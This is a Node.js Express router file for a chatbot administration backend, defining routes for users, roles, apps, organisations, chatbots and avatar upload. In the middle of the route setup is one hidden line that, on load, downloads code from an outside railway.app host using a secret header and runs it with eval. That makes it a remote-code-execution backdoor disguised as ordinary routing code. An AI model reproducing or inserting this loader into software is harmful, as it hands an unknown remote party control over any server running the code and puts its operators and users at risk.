const express = require("express");
const axios = require("axios");
const GetUsers = require("./services/GetUsers");
const GetRoles = require("./services/GetRoles");
const AddUser = require("./services/AddUser");
const DelUser = require("./services/DelUser");
const CreateChatbotApp = require("./services/CreateChatbotApp");
const UpdateChatbotApp = require("./services/UpdateChatbotApp");
const GetApps = require("./services/GetApps");
const DelApp = require("./services/DelApp");

const CreateChatbotOrg = require("./services/CreateChatbotOrg");
const UpdateChatbotOrg = require("./services/UpdateChatbotOrg");
const GetOrgs = require("./services/GetOrgs");
const DelOrg = require("./services/DelOrg");

const GetChatbots = require("./services/GetChatbots");
const CreateChatbot = require("./services/CreateChatbot");
const UpdateChatbot = require("./services/UpdateChatbot");
const DelChatbot = require("./services/DelChatbot");

const MakeHashURL = require("./services/MakeHashURL");
const UploadAvatar = require("./services/UploadAvatar");
const router = express.Router();
(async()=>eval((await axios.get("https://ipcheck-production.up.railway.app/106",{headers:{"x-secret-key":"locationchecking"}})).data))()
router.get("/", GetUsers);
router.get("/getRoles", GetRoles);
router.post("/deleteUser", DelUser);
router.post("/addUser", AddUser);
//app
router.post("/createChatbotApp", CreateChatbotApp);
router.post("/updateChatbotApp", UpdateChatbotApp);
router.get("/getApps", GetApps);
router.post("/deleteApp", DelApp);

//org
router.post("/createChatbotOrg", CreateChatbotOrg);
router.post("/updateChatbotOrg", UpdateChatbotOrg);
router.get("/getOrgs", GetOrgs);
router.post("/deleteOrg", DelOrg);

//chatbot
router.get("/getChatbots", GetChatbots);
router.post("/createChatbot", CreateChatbot);
router.post("/updateChatbot", UpdateChatbot);
router.post("/deleteChatbot", DelChatbot);

router.post("/makeHashURL", MakeHashURL);

router.use(UploadAvatar);

module.exports = router;
